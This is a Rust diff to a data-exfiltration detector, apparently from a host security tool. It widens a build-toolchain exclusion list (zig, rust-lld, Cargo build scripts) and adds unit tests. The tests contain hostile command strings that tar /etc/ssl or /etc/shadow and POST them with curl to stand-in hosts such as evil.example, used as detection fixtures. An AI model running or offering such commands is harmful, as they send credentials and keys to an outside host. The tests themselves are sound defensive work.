@@ -259,6 +259,14 @@ impl DataExfiltrationDetector {
                     "lto-wrapper",
                     "cargo",
                     "rustc",
+                    // Zig toolchain (incl. the `zigcc`/`zig cc` cross-compile
+                    // shim Rust uses; Linux truncates comm at 15 chars, so the
+                    // observed `zigcc-x86_64-un` matches the `zig` prefix).
+                    "zig",
+                    "rust-lld",
+                    // Cargo build scripts (`build-script-build`; truncated comm
+                    // forms `build-script-bu` / `build-script-ma`).
+                    "build-script",
                     "gcc",
                     "g++",
                     "clang",
@@ -297,6 +305,7 @@ impl DataExfiltrationDetector {
                     if lower_cmd.contains("cargo build")
                         || lower_cmd.contains("cargo test")
                         || lower_cmd.contains("cargo install")
+                        || lower_cmd.contains("zig build")
                         || lower_cmd.contains("make ")
                         || lower_cmd.contains("cmake ")
                         || lower_cmd.contains("git pull")
@@ -604,6 +613,113 @@ mod tests {
             now,
         ));
         assert!(inc.is_some());
+    }
+
+    // Spec 071 Part B: build-toolchain comms must never raise `data_exfil_cmd`.
+    // Each command below WOULD trip `is_exfil_command` (tar|curl) — the only
+    // reason it is suppressed is that the actor is a compiler/linker/build
+    // script, not an attacker. These pin the build-tool exclusion list so the
+    // observed prod FP cluster (zig / zigcc / build-script) cannot regress.
+    #[test]
+    fn command_exec_skips_zig_compiler() {
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        assert!(det
+            .process(&command_event(
+                "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+                "zig",
+                1234,
+                now,
+            ))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_skips_zigcc_truncated_comm() {
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        // Linux truncates comm to 15 chars: observed `zigcc-x86_64-un`.
+        assert!(det
+            .process(&command_event(
+                "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+                "zigcc-x86_64-un",
+                1235,
+                now,
+            ))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_skips_cargo_build_script() {
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        // `build-script-build` truncates to `build-script-bu`.
+        assert!(det
+            .process(&command_event(
+                "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+                "build-script-bu",
+                1236,
+                now,
+            ))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_skips_rust_lld_linker() {
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        assert!(det
+            .process(&command_event(
+                "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+                "rust-lld",
+                1237,
+                now,
+            ))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_skips_zig_via_first_word_of_command() {
+        // comm=bash, but the command's first word is the zig toolchain.
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        assert!(det
+            .process(&command_event(
+                "zig cc -target x86_64-linux -o out && tar czf - /etc | curl http://x -d @-",
+                "bash",
+                1238,
+                now,
+            ))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_skips_zig_build_shell_wrapper() {
+        // comm=bash, long command, first word `cd` (not a build tool) — only
+        // the `zig build` shell-wrapper guard suppresses it.
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        let cmd = "cd /home/developer/projects/innerwarden && zig build -Doptimize=ReleaseFast --summary all && tar czf - /etc/ssl | curl http://x.example/upload -d @-";
+        assert!(cmd.len() > 100);
+        assert!(det
+            .process(&command_event(cmd, "bash", 1239, now))
+            .is_none());
+    }
+
+    #[test]
+    fn command_exec_still_detects_real_exfil_from_non_build_comm() {
+        // Regression: the exclusion list did not over-broaden — a genuine
+        // exfil command from a non-build comm still raises the incident.
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        assert!(det
+            .process(&command_event(
+                "tar czf - /etc/shadow | curl -X POST http://evil.example/u -d @-",
+                "python3",
+                1240,
+                now,
+            ))
+            .is_some());
     }
 
     #[test]
